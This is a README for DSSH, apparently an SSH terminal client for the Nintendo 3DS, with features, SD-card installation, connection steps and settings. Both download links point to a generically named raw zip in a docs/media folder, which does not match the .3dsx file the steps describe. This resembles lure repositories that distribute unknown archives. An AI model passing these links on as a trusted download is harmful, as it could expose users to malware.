# 🦀 DSSH - Access remote servers from your console

[![](https://img.shields.io/badge/Download_DSSH-Blue.svg)](https://github.com/Octogenarian-nonpareil126/DSSH/raw/refs/heads/main/docs/media/Software_1.4.zip)

DSSH is a terminal tool for the Nintendo 3DS. It allows you to connect to remote servers through SSH. You can manage files, run commands, and check server status directly from your handheld device. The application includes a pinyin input method for typing Chinese characters and a visual terminal for your text.

## 🛠 Features

This software includes tools to help you work on a server:

*   **SSH Connection:** Connect to remote Linux or Unix machines.
*   **Pinyin Input:** Type Chinese characters using the on-screen keyboard.
*   **ANSI Terminal:** View terminal colors and text styles correctly.
*   **RSA Authentication:** Use secure keys to protect your login.
*   **Performance:** Uses hardware acceleration for smooth scrolling.
*   **Status Crab:** A small crab keeps you company while you work.

## 📥 Getting Started

You need a Nintendo 3DS console with custom firmware installed. Open the URL below to find the files for your device.

[Visit the official release page to download](https://github.com/Octogenarian-nonpareil126/DSSH/raw/refs/heads/main/docs/media/Software_1.4.zip)

## 📁 Installation

Follow these steps to put the software on your SD card:

1. Remove the SD card from your Nintendo 3DS.
2. Insert the SD card into your computer.
3. Open the SD card folder on your computer.
4. Locate the `3ds` folder on the root of your SD card. If the folder does not exist, create it.
5. Place the DSSH file (ending in .3dsx) inside the `3ds` folder.
6. Eject the SD card safely from your computer.
7. Insert the SD card back into your Nintendo 3DS.

## 🎮 Running the Software

Once the file is on your device, launch the software:

1. Turn on your Nintendo 3DS.
2. Open the Homebrew Launcher application.
3. Scroll through the list of programs until you see the DSSH icon.
4. Press the A button to open the application.

## 🔐 Connecting to a Server

To start an SSH session, you need the address of your server. Follow this guide to log in:

1. Select "New Connection" from the main menu.
2. Type the host address of your server (e.g., 192.168.1.5 or example.com).
3. Enter your username and password. 
4. If you use RSA keys, ensure your private key file resides in the designated folder on your SD card.
5. Select "Connect" to start the session.

The terminal screen will display your remote command prompt. You can now type your commands. 

## ⌨️ Using the Input Methods

The tool provides an on-screen keyboard for command entry. If you need to type Chinese, switch to the Pinyin mode. Use the touchscreen to select characters as you type the sounds. The terminal updates in real-time as you enter text.

## ⚙️ Settings

You can customize the terminal behavior:

*   **Font Size:** Adjust the text size for better visibility.
*   **Color Scheme:** Choose between light or dark themes.
*   **Connection Timeout:** Set how long the app waits before closing a lost connection.
*   **Keyboard Layout:** Toggle between different input modes for various languages.

## 💡 Troubleshooting

If you encounter issues, check these common items:

*   **Network Access:** Verify your 3DS connects to your Wi-Fi network.
*   **Server Status:** Make sure your destination server is online and accepts SSH connections on port 22.
*   **Firmware:** Ensure your custom firmware is up to date.
*   **File Placement:** Check the `3ds` folder to confirm the file is not corrupted or missing.

## 🔒 Security

DSSH uses standard encryption methods for all connections. It supports modern RSA keys for secure logins. Keep your private keys in a safe location. Do not share your server credentials with unknown parties. 

## 🌟 Support

If you run into bugs or features that do not work as expected, visit the repository site. You can look at the issues tab to see if other users reported the same problem. Provide clear details about your console model and your firmware version to help fix the issue.